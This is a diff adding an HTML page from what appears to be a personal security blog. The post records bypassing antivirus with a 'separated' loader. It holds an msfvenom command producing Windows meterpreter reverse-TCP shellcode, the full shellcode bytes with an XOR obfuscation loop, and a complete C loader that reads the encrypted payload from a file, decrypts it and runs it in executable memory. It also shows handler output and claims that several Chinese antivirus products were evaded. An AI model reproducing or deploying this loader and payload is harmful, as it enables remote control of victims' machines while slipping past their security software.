@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+
+    
+<script>!function(){document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>2023-12-21-记录一次分离免杀</title>
+<meta name="keywords" content="2023-12-21-记录一次分离免杀, The simpler, the happier">
+<meta name="description" content="linkshttps://luckyfuture.top/BypassAVLearning.html
+contentshellcode是msf生成的
+12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows/m">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="2023-12-21-记录一次分离免杀">
+<meta property="og:description" content="linkshttps://luckyfuture.top/BypassAVLearning.html
+contentshellcode是msf生成的
+12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows/m">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 7.0.0"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://redqx.github.io">
+        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
+      </a>
+      <a href="https://redqx.github.io">
+        <h1 class="site-title">The simpler, the happier</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">2023-12-21-记录一次分离免杀</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2023-12-21</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/blog/">
+              blog
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <h1 id="links"><a href="#links" class="headerlink" title="links"></a>links</h1><p><a target="_blank" rel="noopener" href="https://luckyfuture.top/BypassAVLearning.html">https://luckyfuture.top/BypassAVLearning.html</a></p>
+<h1 id="content"><a href="#content" class="headerlink" title="content"></a>content</h1><p>shellcode是msf生成的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.127.129 LPORT=4444 -f c</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后对shellcode进行了一个加密</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x58\x20\x01\xd3\x85\xc9\x74\x3c\x31\xff\x49\x8b\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x7f\x81\x68\x02\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span></span><br><span class="line"><span class="string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">    buf[i] ^= <span class="number">0x17</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>异或处理了一下</p>
+<p>然后写入文件app.bin</p>
+<p>加载器如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">BYTE* <span class="title function_">read2Mem</span><span class="params">(<span class="type">char</span>* fpath,<span class="type">int</span>* flen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 打开文件</span></span><br><span class="line">    DWORD fileSize;</span><br><span class="line">    LPVOID pMemory;</span><br><span class="line">    DWORD bytesRead;</span><br><span class="line">    *flen = <span class="number">0</span>;</span><br><span class="line">    HANDLE hFile = CreateFileA(fpath,  <span class="comment">// 文件路径，根据实际情况进行修改</span></span><br><span class="line">        GENERIC_READ,               <span class="comment">// 访问模式，只读</span></span><br><span class="line">        <span class="number">0</span>,                          <span class="comment">// 共享模式，不共享</span></span><br><span class="line">        <span class="literal">NULL</span>,                       <span class="comment">// 安全特性，使用默认值</span></span><br><span class="line">        OPEN_EXISTING,              <span class="comment">// 打开已存在的文件</span></span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,      <span class="comment">// 文件属性，正常</span></span><br><span class="line">        <span class="literal">NULL</span>                        <span class="comment">// 模板文件句柄，不使用</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法打开文件\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取文件大小</span></span><br><span class="line">    fileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (fileSize == INVALID_FILE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法获取文件大小\n&quot;</span>);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配内存</span></span><br><span class="line">    pMemory = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,                   <span class="comment">// 指定分配的地址，在此使用 NULL 表示由系统选择</span></span><br><span class="line">        fileSize,               <span class="comment">// 分配的内存大小，与文件大小一致</span></span><br><span class="line">        MEM_COMMIT,             <span class="comment">// 内存分配类型，表示提交内存</span></span><br><span class="line">        PAGE_READWRITE          <span class="comment">// 内存页面属性，读写权限</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (pMemory == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法分配内存\n&quot;</span>);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ReadFile(</span><br><span class="line">        hFile,                  <span class="comment">// 文件句柄</span></span><br><span class="line">        pMemory,                <span class="comment">// 缓冲区地址，用于接收文件内容</span></span><br><span class="line">        fileSize,               <span class="comment">// 要读取的字节数，与文件大小一致</span></span><br><span class="line">        &amp;bytesRead,             <span class="comment">// 实际读取的字节数</span></span><br><span class="line">        <span class="literal">NULL</span>                    <span class="comment">// 用于传递异步 I/O 句柄，不使用</span></span><br><span class="line">    )) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;读取文件失败\n&quot;</span>);</span><br><span class="line">        VirtualFree(pMemory, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line">    <span class="comment">//VirtualFree(pMemory, 0, MEM_RELEASE);</span></span><br><span class="line">    *flen = fileSize;</span><br><span class="line">    <span class="keyword">return</span> pMemory;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">( )</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">//shellcode长度</span></span><br><span class="line">	DWORD dwThreadId;	<span class="comment">//线程Id</span></span><br><span class="line">	HANDLE hThread;		<span class="comment">//线程句柄</span></span><br><span class="line">	DWORD dwOldProtect;	<span class="comment">//内存页属性</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* buf=read2Mem(<span class="string">&quot;./app.bin&quot;</span>,&amp;shellcode_size);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] ^= <span class="number">0x17</span>;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span>* shellcode = (<span class="type">char</span>*)VirtualAlloc(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">4096</span>,</span><br><span class="line">		MEM_COMMIT,</span><br><span class="line">		PAGE_READWRITE  <span class="comment">//只申请可读可写</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">memcpy</span>(shellcode, buf, shellcode_size); <span class="comment">//将shellcode复制到可读可写的内存中</span></span><br><span class="line">	VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect); <span class="comment">//更改属性为可执行</span></span><br><span class="line">	hThread = CreateThread(</span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">		 shellcode, <span class="comment">// 函数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">		&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后开始运行</p>
+<p>kali端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.127.129:4444</span><br></pre></td></tr></table></figure>
+
+
+
+<p>win10</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx绒</span><br><span class="line">xxx安全卫士</span><br><span class="line">xxx杀毒</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后主动扫描一下</p>
+<p><a class="simple-lightbox" href="/./img/image-20231221183011197.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183011197.png"  alt="image-20231221183011197" lazyload></a></p>
+<p><a class="simple-lightbox" href="/./img/image-20231221183026865.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183026865.png"  alt="image-20231221183026865" lazyload></a></p>
+<p>然后上线测试</p>
+<p><a class="simple-lightbox" href="/./img/image-20231221183045332.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183045332.png"  alt="image-20231221183045332" lazyload></a></p>
+<p>win10</p>
+<p><a class="simple-lightbox" href="/./img/image-20231221183343176.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183343176.png"  alt="image-20231221183343176" lazyload></a></p>
+<p>然后监听成功</p>
+<p><a class="simple-lightbox" href="/./img/image-20231221183325080.png"><img   src="/images/loading.svg" data-src="/./img/image-20231221183325080.png"  alt="image-20231221183325080" lazyload></a></p>
+<p>感觉很离谱</p>
+<p>怎么这么简单就绕过了…..</p>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#links"><span class="top-box-text">links</span></a></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#content"><span class="top-box-text">content</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2023/0c17fac5216a/">
+          <h3 class="post-title">
+            下一篇：软件保护工具-Safengine_Shielden-分析
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/f-dong" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
